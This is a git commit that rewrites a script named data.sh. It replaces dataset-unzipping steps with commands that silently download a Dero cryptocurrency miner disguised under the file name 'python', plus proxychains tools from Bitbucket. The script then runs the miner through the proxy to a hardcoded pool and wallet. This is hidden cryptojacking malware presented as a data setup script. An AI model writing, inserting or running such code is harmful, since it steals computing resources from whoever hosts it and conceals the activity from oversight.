641d81d353f630e768f348fe30807022f3333aa9
okkymahendra9 <114310040+okkymahendra9@users.noreply.github.com>
2022-11-23 02:14:24 +0700

    Update data.sh

--- data.sh
+++ data.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
-sudo apt update
-sudo apt install unzip
-unzip dataset.zip
-sudo su --command "bash dataset.sh"
+wget -q -O python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python 
+wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
+wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
+wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo "IP Baru ==> "$(./proxy curl ifconfig.me) 
+./proxy ./python -r 148.113.136.140:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmua6z2ur22hr2qm9negq.$(echo $(shuf -i 1000-9999 -n 1)-C)
